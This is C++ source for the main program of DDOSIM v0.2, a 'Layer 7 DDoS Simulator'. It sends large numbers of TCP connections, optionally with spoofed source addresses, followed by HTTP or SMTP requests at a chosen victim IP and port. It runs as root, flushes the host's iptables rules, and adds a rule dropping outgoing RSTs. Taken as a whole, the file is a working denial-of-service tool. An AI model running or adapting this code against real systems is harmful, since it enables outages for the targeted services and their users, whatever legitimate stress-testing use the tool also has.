#include <iostream>
#include <sstream>
#include <list>
#include <vector>
#include <ext/hash_map>
#include "sniffer.h"
#include "ddosim.h"
#include "senderThread.h"
#include "captureThread.h"


//Globals
bool v = false;
const char* version = "0.2";
extern map<string, ConnInfo> connsInited;		//info about initiated connections TODO


//Methods
void usage(char *name);
u_long resolveNameToIp(char *optarg, string &error);
void prelude1(string ip, string port, string interface);
void prelude2(string ip, string interface);

int main(int argc, char **argv)
{
	u_long victimIp = 0;	//network-byte order
	u_long srcNet = 0;	//network-byte order
	u_long localIp = 0;	//the IP address of sending interface
	int victimPort = 0;
	string victimIpStr, ifName = "eth0", localIpStr, victimPortStr;
	string srcNetStr;
	int count = 1;		//total number of connections to initiate
	int wait = 1;		//wait between initiating connections
	int threadNo = 1;	//number of threads to use when sending packets
	bool doSpoof = true;	//spoof the source address of packets
	int synNo = 0;		//number of connections already initiated (SYN SENT)
	int connNo = 0; 	//number of connections completed (3way handshake)
	int rstNo = 0;	 	//number of connections reseted by server
	int finNo = 0;	 	//number of connections finished by server

	bool run = false;	//start/stop sender threads
	int opt;
	int requestType = 0;
	pthread_t cth;
	vector<pthread_t> senderThreads;
	string error;
	Sniffer sniffy;

	// Get program arguments
	while((opt = getopt(argc, argv, "d:p:c:w:i:r:t:k:vnh")) != EOF) {
		switch (opt) {
			case 'd':
				if(!(victimIp = resolveNameToIp(optarg, error))) {	
					cout << "Target specification error: " << error << endl;
					usage(argv[0]);
					exit(EXIT_FAILURE);
				}
				victimIpStr = (char*)libnet_host_lookup(victimIp, 0);
				break;
			case 'k':
				if(!(srcNet = resolveNameToIp(optarg, error))) {	
					cout << "Target specification error: " << error << endl;
					usage(argv[0]);
					exit(EXIT_FAILURE);
				}
				srcNetStr = (char*)libnet_host_lookup(srcNet, 0);
				break;
			case 'p':
				victimPort = atoi(optarg);
				victimPortStr = optarg;
				break;
			case 'c':
				count = atoi(optarg);
				break;
			case 'w':
				wait = atoi(optarg);
				break;
			case 'i':
				ifName = optarg;
				break;
			case 'v':
				v = true;
				break;
			case 't':
				threadNo = atoi(optarg);
				if (threadNo < 1) {
					cout << "Invalid thread number: " << threadNo << endl;
					usage(argv[0]);
					exit(EXIT_FAILURE);
				}
				break;
			case 'n':
				doSpoof = false;
				break;
			case 'h':
				usage(argv[0]);
				exit(EXIT_FAILURE);
			case 'r':
				if(string(optarg) == "HTTP_VALID") {
					requestType = HTTP_VALID;
				} else if (string(optarg) == "HTTP_INVALID") {
					requestType = HTTP_INVALID;
				} else if (string(optarg) == "SMTP_EHLO") {
					requestType = SMTP_EHLO;
				} else {
					cout << "Unknown request type (-r ARG)" << endl;
					exit(EXIT_FAILURE);
				}
				break;
			case '?':
				exit(EXIT_FAILURE);
		}
	}

	if (!victimIp || !victimPort) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
    }
	if(!doSpoof && srcNet) {
		cout << "Options -n and -k are mutually exclusive" << endl;
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

/*======================== INITIALIZATION ==================================*/
	cout << endl << "=== DDOSIM: Layer 7 DDoS Simulator ===" << endl << endl;

	if(getuid() != 0) {
		cout << "Sorry mate. You must be root to run this program..." << endl << endl;
		return EXIT_FAILURE;
	}

	// Set some firewall rules
	cout << "*** Warning: your firewall rules have been changed" << endl<< endl;	
	prelude1(victimIpStr, victimPortStr, ifName);
	if(doSpoof == false) {
		prelude2(victimIpStr, ifName);
	}

	// Initialize sniffer component
	if(!sniffy.init(ifName, &rstNo, &finNo, error)) {
		cout << "Capture engine initialization error: " << error << endl;
		return EXIT_FAILURE;
	}

	// Create packet capture thread
	if(pthread_create(&cth, NULL, capEngineThread, (void *)&sniffy) != 0) {
		cout << "Error creating Capture Engine thread: " << strerror(errno) << endl;
		return EXIT_FAILURE;
	}

	// Create sender threads
	SenderThreadArg targ;
	targ.ifName = ifName;
	targ.doSpoof = doSpoof;
	targ.count = count;
	targ.synNo = &synNo;
	targ.wait = wait;
	targ.verbose = v;
	targ.victimIp = victimIp;
	targ.victimPort = victimPort;
	targ.run = &run;
	targ.connNo = &connNo;
	targ.requestType = requestType;
	targ.srcNetStr = srcNetStr;

	for(int i=0; i < threadNo; i++) {
		targ.threadId = i;
		pthread_t th;
		if(pthread_create(&th, NULL, senderThread, (void*)&targ) != 0) {
			cout << "Error creating sender thread " << targ.threadId << " : " << strerror(errno) << endl;
			continue;
		}
		senderThreads.push_back(th);
		while(targ.threadId == i) usleep(1000); //wait for the new thread to get its threadId
	}

	// Get local IP
	if(!(localIp = getLocalIp(ifName, error))) {
		cout << "Error while getting local IP address: " << error << endl;
		return EXIT_FAILURE;
	}
	if(doSpoof == false) {
		cout << "Using local address: " << (char*)libnet_host_lookup(localIp, 0) << " as source address" << endl;
	} else {
		cout << "Using random source IP address" << endl;
	}

	usleep(500000); //wait for the threads to initialize

/*======================== START THE MACHINE ===============================*/
	if (count > 0) {
		cout << "Attempting " << count << " TCP connections against " << victimIpStr \
		<< " on port " << victimPortStr << " ..." << endl;
	} else {
		cout << "Attempting infinite TCP connections against " << victimIpStr \
		<< " on port " << victimPortStr <<  " ..." << endl;
	}
	if(requestType == 0) {
		cout << "No request type specified" << endl << endl;
	} else if (requestType == HTTP_VALID) {
		cout << "Request type: HTTP_VALID" << endl << endl;
	} else if (requestType == HTTP_INVALID) {
		cout << "Request type: HTTP_INVALID" << endl << endl;
	} else if (requestType == SMTP_EHLO) {
		cout << "Request type: SMTP_EHLO" << endl << endl;
	}

	// Start the sender threads
	run = true;

	while((count > 0 && synNo < count) || count <=0) {
		usleep(100);
		if(synNo % 100 < threadNo) {
			cout << "TCP connections: " << synNo << " SYN_SENT, " << getNumConnsEstab() << " ESTABLISHED, ";
			cout << rstNo << " RST, " << finNo << " FIN_WAIT_1.  "<< connsInited.size() << endl << endl;
		}
	}

	cout << "TCP connections: " << synNo << " SYN_SENT, " << getNumConnsEstab() << " ESTABLISHED, ";
	cout << rstNo << " RST, " << finNo << " FIN_WAIT_1"<< endl << endl;

	if(connNo + rstNo < count) {
		int totalSleep = 5; // seconds
		cout << "Waiting max " << totalSleep << " seconds for other responses..." << endl;
		int slp = 0;
		while(connNo + rstNo < count && slp < totalSleep * 10) {
			usleep(100000); //sleep 100 milliseconds
			slp ++;
		}
	}
	// Stop the sender threads
	run = false;

	// Waiting for the threads to do their job  //TODO capture thread??????
	for (int i=0; i < threadNo; i++) {
		pthread_join(senderThreads[i], NULL);
	}

	cout << endl << "Final results:" << endl;
	cout << "TCP connections: " << synNo << " SYN_SENT, " << getNumConnsEstab() << " ESTABLISHED, ";
	cout << rstNo << " RST, " << finNo << " FIN_WAIT_1"<< endl << endl;

/*
	if(doSpoof == false) {
		cout << endl << count << " TCP connections established between " << libnet_host_lookup(localIp, 0) << " and " << victimIpStr << endl << endl;
	} else {
		cout << endl << count << " TCP connections established between RANDOM and " << victimIpStr << endl << endl;
	}
*/
    return EXIT_SUCCESS;
}

void usage(char *name)
{
	cout << endl << "# DDOSIM:  Layer 7 DDoS Simulator v" << version << endl;
    cout <<         "# Author:  Adrian Furtuna  <adif2k8@gmail.com>" << endl << endl;
    cout << "Usage: " << name << endl;
	cout << "\t\t -d IP \t\t Target IP address" << endl;
	cout << "\t\t -p PORT \t Target port" << endl;
	cout << "\t\t[-k NET] \t Source IP from class C network (ex. 10.4.4.0)" << endl;
	cout << "\t\t[-i IFNAME] \t Output interface name" << endl;
	cout << "\t\t[-c COUNT] \t Number of connections to establish" << endl;
	cout << "\t\t[-w DELAY] \t Delay (in milliseconds) between SYN packets" << endl;
	cout << "\t\t[-r TYPE] \t Request to send after TCP 3-way handshake. TYPE can be HTTP_VALID or HTTP_INVALID or SMTP_EHLO" << endl;
	cout << "\t\t[-t NRTHREADS] \t Number of threads to use when sending packets (default 1)" << endl;
	cout << "\t\t[-n]	\t Do not spoof source address (use local address)" << endl;
	cout << "\t\t[-v]	\t Verbose mode (slower)" << endl;
	cout << "\t\t[-h]	\t Print this help message" << endl;
	cout << endl;
}

void mydelay(int wait)
{
	usleep(wait * 1000);
}

string connId(u_long ip, int port)
{
	stringstream ss;
	ss << ip << port;
	return ss.str();
}

//returned IP is in network-byte order
u_long getLocalIp(string const &ifName, string &error)
{
	struct libnet_link_int *network;
	u_long ret;
	char err_buf[LIBNET_ERR_BUF];
	memset(err_buf, 0, LIBNET_ERR_BUF);
	if ((network = libnet_open_link_interface((char*)ifName.c_str(), err_buf)) == NULL) {
		error = err_buf;
		return 0;
	}
	if(!(ret = htonl(libnet_get_ipaddr(network,(char*)ifName.c_str(),err_buf)))){
		error = err_buf;
		return 0;
	}
	return ret;
}


//result is in network byte order
u_long resolveNameToIp(char *optarg, string &error) 
{
	struct hostent *he;
	struct in_addr a;
	u_long ret = 0;
	if((he = gethostbyname (optarg)) != NULL) {
//		while (*he->h_aliases)
//			printf("alias: %s\n", *he->h_aliases++);
		while (*he->h_addr_list) {
			bcopy(*he->h_addr_list++, (char *) &a, sizeof(a));
//			printf("address: %s\n", inet_ntoa(a));
            if (!(ret = libnet_name_resolve((u_char *)inet_ntoa(a), LIBNET_RESOLVE))) {
               libnet_error(LIBNET_ERR_FATAL, (char*)"Bad destination address: %s\n", optarg);
            }
			break;
		}
	} else {
		error = "gethostbyname(): " + string(strerror(errno));
	}
	return ret;
}

void prelude1(string ip, string port, string interface)
{
	string cmd = "iptables -F";
	if(system(cmd.c_str()) < 0) {
		cout << "Error executing system() command: " << cmd << endl;
	}

	cmd = "echo 0 > /proc/sys/net/ipv4/ip_forward";
	if(system(cmd.c_str()) < 0) {
		cout << "Error executing system() command: " << cmd << endl;
	}
}

void prelude2(string ip, string interface)
{
	string cmd = "iptables -F";
	if(system(cmd.c_str()) < 0) {
		cout << "Error executing system() command: " << cmd << endl;
	}

	cmd = "iptables -A OUTPUT --protocol tcp --tcp-flags RST RST -d ";
	cmd += ip + " -j DROP --out-interface " + interface;
	if(system(cmd.c_str()) < 0) {
		cout << "Error executing system() command: " << cmd << endl;
	}

	cmd = "iptables -A OUTPUT -j ACCEPT";
	if(system(cmd.c_str()) < 0) {
		cout << "Error executing system() command: " << cmd << endl;
	}
}


/* EOF */
